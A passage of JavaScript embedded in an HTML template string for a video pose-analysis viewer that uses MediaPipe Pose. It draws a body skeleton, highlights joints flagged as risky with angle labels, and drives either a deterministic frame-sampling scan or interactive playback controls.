      limb(mS,mH,S*0.075,S*0.065,"rgba(237,236,231,0.80)",0);
      limb(sL,sR,S*0.055,S*0.055,"rgba(237,236,231,0.62)",0);
      limb(hL,hR,S*0.058,S*0.058,"rgba(237,236,231,0.62)",0);
    }

    // ── Head ──
    // An actual skull, sized from the ears when they are visible and estimated
    // from the neck when they are not. A single dot on the nose was the least
    // anatomical thing on screen.
    if (vis(7) && vis(8)) {
      var eL=pt(7), eR=pt(8);
      var ew=Math.sqrt((eL.x-eR.x)*(eL.x-eR.x)+(eL.y-eR.y)*(eL.y-eR.y));
      var hc={x:(eL.x+eR.x)/2,y:(eL.y+eR.y)/2};
      var hr=Math.max(ew*0.78, S*0.26);
      ctx.save();
      ctx.fillStyle=PART.head;
      ctx.beginPath(); ctx.ellipse(hc.x,hc.y,hr,hr*1.22,Math.atan2(eR.y-eL.y,eR.x-eL.x),0,6.2832); ctx.fill();
      ctx.restore();
      // Neck, joining skull to the shoulder girdle.
      if (vis(11)&&vis(12)) { var mS2={x:(pt(11).x+pt(12).x)/2,y:(pt(11).y+pt(12).y)/2}; limb(hc,mS2,S*0.10,S*0.13,"rgba(237,236,231,0.55)",0); }
    } else if (vis(0) && vis(11) && vis(12)) {
      var n=pt(0), mS3={x:(pt(11).x+pt(12).x)/2,y:(pt(11).y+pt(12).y)/2};
      ctx.save();
      ctx.fillStyle=PART.head;
      ctx.beginPath(); ctx.arc(n.x,n.y,S*0.28,0,6.2832); ctx.fill();
      ctx.restore();
      limb(n,mS3,S*0.10,S*0.13,"rgba(237,236,231,0.55)",0);
    }

    // ── Limbs, then extremities ──
    LIMBS.forEach(function(seg){
      if (!vis(seg[0]) || !vis(seg[1])) return;
      var c = segColor(seg[0], seg[1], seg[4]);
      limb(pt(seg[0]), pt(seg[1]), S*seg[2], S*seg[3], c.col, c.glow);
    });
    EXTREM.forEach(function(seg){
      if (!vis(seg[0]) || !vis(seg[1])) return;
      var c = segColor(seg[0], seg[1], seg[4]);
      limb(pt(seg[0]), pt(seg[1]), S*seg[2], S*seg[3], c.col, 0);
    });

    ctx.restore();

    // ── Joint markers ──
    // Only the measured joints get a ring; the rest get a small stud. A flagged
    // joint is the brightest thing in the frame, which is the whole point.
    var seen = 0;
    KJ.forEach(function(i){
      if (!vis(i)) return;
      seen++;
      var p = pt(i), risk = jr[i];
      var isMeasured = !!risk;
      var col = risk ? RL[risk.lvl] : "rgba(237,236,231,0.85)";
      var r = risk ? (risk.lvl === 2 ? S*0.075 : risk.lvl === 1 ? S*0.065 : S*0.055) : S*0.030;
      ctx.save();
      if (isMeasured) { ctx.shadowBlur = risk.lvl >= 2 ? 16 : 10; ctx.shadowColor = col; }
      ctx.fillStyle = col; ctx.beginPath(); ctx.arc(p.x, p.y, r, 0, 6.2832); ctx.fill();
      if (isMeasured) {
        ctx.shadowBlur = 0;
        ctx.fillStyle = "#101312";
        ctx.beginPath(); ctx.arc(p.x, p.y, r*0.42, 0, 6.2832); ctx.fill();
      }
      ctx.restore();
    });
    if (btxt) btxt.textContent = seen > 0 ? seen + " joints tracked" : "No pose detected";

    function label(x,y,txt,col){
      ctx.save();
      ctx.font = "bold 15px -apple-system,sans-serif";
      var w = ctx.measureText(txt).width + 16;
      ctx.fillStyle = "rgba(4,4,12,.9)";
      ctx.beginPath(); ctx.roundRect(x - w/2, y - 15, w, 28, 7); ctx.fill();
      ctx.fillStyle = col; ctx.textAlign = "center"; ctx.textBaseline = "middle";
      ctx.fillText(txt, x, y);
      ctx.restore();
    }
    [[25,34,0],[26,-34,0],[23,38,-12],[24,-38,-12]].forEach(function(cfg){
      var j = jr[cfg[0]];
      if (!j) return;
      label(pt(cfg[0]).x + cfg[1], pt(cfg[0]).y + cfg[2], j.deg + "\\u00B0", RL[j.lvl]);
    });

    var out = { data:{}, risk:{} };
    KEYS.forEach(function(k){ out.data[k] = 0; out.risk[k] = 0; });
    measured.forEach(function(i){ out.data[jr[i].key] = jr[i].deg; out.risk[jr[i].key] = jr[i].lvl; });
    post({ type:"angles", data: out.data, risk: out.risk, maxLvl: maxLvl });
  }

  // ── Scan driver ──
  // Deterministic: the same clip always samples the same timestamps.
  var scanIndex = 0, scanTimes = [];

  function planScan(){
    var dur = video.duration;
    if (!isFinite(dur) || dur <= 0) { fail("Couldn't read this video's length."); return false; }
    var samples = Math.max(10, Math.min(SCAN_SAMPLES, Math.round(dur * 12)));
    scanTimes = [];
    for (var i = 0; i < samples; i++) {
      // Inset from both ends: the first and last frames are often blurred or black.
      scanTimes.push(dur * ((i + 0.5) / samples));
    }
    return true;
  }

  function advanceScan(){
    if (!IS_SCAN) return;
    scanIndex++;
    post({ type:"progress", done: scanIndex, total: scanTimes.length });
    if (loadSub) {
      loadSub.textContent = "Analysing frame " + Math.min(scanIndex + 1, scanTimes.length) +
        " of " + scanTimes.length;
    }
    if (scanIndex >= scanTimes.length) { finishScan(); return; }
    seekTo(scanTimes[scanIndex]);
  }

  var finished = false;
  function finishScan(){
    if (finished) return;
    finished = true;
    clearTimeout(watchdog);
    post({ type:"metrics", metrics: buildMetrics() });
  }

  function seekTo(t){
    try { video.currentTime = t; } catch(e) { finishScan(); }
  }

  // ── Pose init ──
  var initTimeout = setTimeout(function(){
    if (!loading.classList.contains("hide") && !IS_SCAN) {
      fail("The pose model is taking too long to load. Check your connection.");
    }
  }, 25000);

  var pose = new Pose({ locateFile: function(f){ return "${MEDIAPIPE_BASE}/" + f; } });
  pose.setOptions({
    modelComplexity: 1, smoothLandmarks: !IS_SCAN,
    enableSegmentation: false, minDetectionConfidence: .5, minTrackingConfidence: .5
  });
  pose.onResults(onResults);

  // The scan may only start once BOTH the pose model and the video's metadata
  // are ready. planScan() reads video.duration, and which of the two arrives
  // first is a race the model usually loses only while the MediaPipe WASM is
  // a cold download — with a warm cache it initialises before loadedmetadata
  // fires, duration reads NaN, and a perfectly good clip failed with
  // "Couldn't read this video's length."
  var modelReady = false, metaReady = false, scanStarted = false;
  function maybeStartScan(){
    if (!IS_SCAN || scanStarted || !modelReady || !metaReady) return;
    scanStarted = true;
    if (planScan()) { armWatchdog(); seekTo(scanTimes[0]); }
  }

  // If metadata truly never arrives (a corrupt file), fail honestly rather
  // than hanging the loading screen forever.
  setTimeout(function(){
    if (IS_SCAN && modelReady && !scanStarted) fail("Couldn't read this video's length.");
  }, 20000);

  pose.initialize().then(function(){
    clearTimeout(initTimeout);
    post({ type:"ready" });
    if (IS_SCAN) {
      modelReady = true;
      maybeStartScan();
    } else {
      loading.classList.add("hide");
      if (btxt) btxt.textContent = "Ready. Press play";
      setTimeout(detect, 100);
    }
  }).catch(function(err){
    clearTimeout(initTimeout);
    fail((err && err.message) ? err.message : "The pose model failed to start.");
  });

  function detect(){
    if (busy || !video.readyState) return;
    busy = true;
    pose.send({ image: video }).catch(function(){ busy = false; if (IS_SCAN) advanceScan(); });
  }

  // A stalled seek must not hang the scan forever — finish with what we have.
  var watchdog;
  function armWatchdog(){
    clearTimeout(watchdog);
    watchdog = setTimeout(function(){
      if (!finished) {
        if (trackedFrames > 0) finishScan();
        else fail("Couldn't read frames from this video.");
      }
    }, 90000);
  }

  // ── Video wiring ──
  video.src = VIDEO_URI;
  video.load();

  video.addEventListener("error", function(){
    fail("This video couldn't be opened. It may have been moved or deleted.");
  });

  video.addEventListener("loadedmetadata", function(){
    post({ type:"meta", vw: video.videoWidth, vh: video.videoHeight, dur: video.duration });
    metaReady = true;
    maybeStartScan();
    if (!IS_SCAN) {
      var scrub = document.getElementById("scrub");
      if (scrub) scrub.max = video.duration;
      var timeR = document.getElementById("timeR");
      if (timeR) timeR.textContent = fmt(video.duration);
    }
  });

  // In scan mode every measurement is driven by a completed seek, which is what
  // makes the sample set reproducible.
  video.addEventListener("seeked", function(){
    if (IS_SCAN) { armWatchdog(); detect(); }
    else detect();
  });

  if (!IS_SCAN) {
    video.addEventListener("loadeddata", function(){ setTimeout(detect, 80); });
    video.addEventListener("timeupdate", function(){
      var timeL = document.getElementById("timeL");
      var scrub = document.getElementById("scrub");
      if (timeL) timeL.textContent = fmt(video.currentTime);
      if (scrub) scrub.value = video.currentTime;
    });
    video.addEventListener("ended", function(){
      playing = false;
      var pb = document.getElementById("playBtn");
      if (pb) pb.innerHTML = "&#9654;";
      cancelAnimationFrame(raf);
    });
  }

  function fmt(t){
    if (!isFinite(t)) return "0:00";
    var s = Math.floor(t);
    return Math.floor(s/60) + ":" + String(s%60).padStart(2,"0");
  }

  // The stage sizes itself: body is a flex column and #wrap is flex:1. See the
  // comment on #wrap in the stylesheet for what the imperative version got
  // wrong.

  // ── Interactive controls ──
  var raf = 0;
  function loop(){
    if (!playing || video.paused || video.ended) return;
    detect();
    raf = requestAnimationFrame(loop);
  }

  if (!IS_SCAN) {
    var playBtn = document.getElementById("playBtn");
    var skelBtn = document.getElementById("skelBtn");
    var scrubEl = document.getElementById("scrub");

    function play(){ video.play(); playing = true; playBtn.innerHTML = "&#9646;&#9646;"; loop(); }
    function pause(){ video.pause(); playing = false; playBtn.innerHTML = "&#9654;"; cancelAnimationFrame(raf); }

    if (playBtn) playBtn.onclick = function(){ playing ? pause() : play(); };
    var bk = document.getElementById("bk");
    var fw = document.getElementById("fw");
    if (bk) bk.onclick = function(){ pause(); video.currentTime = Math.max(0, video.currentTime - 1/30); };
    if (fw) fw.onclick = function(){ pause(); video.currentTime = Math.min(video.duration || 99, video.currentTime + 1/30); };

    if (scrubEl) {
      scrubEl.addEventListener("input", function(e){
        pause();
        video.currentTime = parseFloat(e.target.value);
      });
    }

    Array.prototype.forEach.call(document.querySelectorAll(".spd"), function(btn){
      btn.onclick = function(){
        video.playbackRate = parseFloat(btn.dataset.s);
        Array.prototype.forEach.call(document.querySelectorAll(".spd"), function(b){ b.classList.remove("on"); });
        btn.classList.add("on");
      };
    });

    if (skelBtn) {
      skelBtn.onclick = function(){
        showSkel = !showSkel;
        skelBtn.className = "tbtn " + (showSkel ? "on" : "off");
        if (!showSkel) ctx.clearRect(0, 0, canvas.width, canvas.height);
      };
    }
  }
})();
</script>
</body>
</html>`;
}
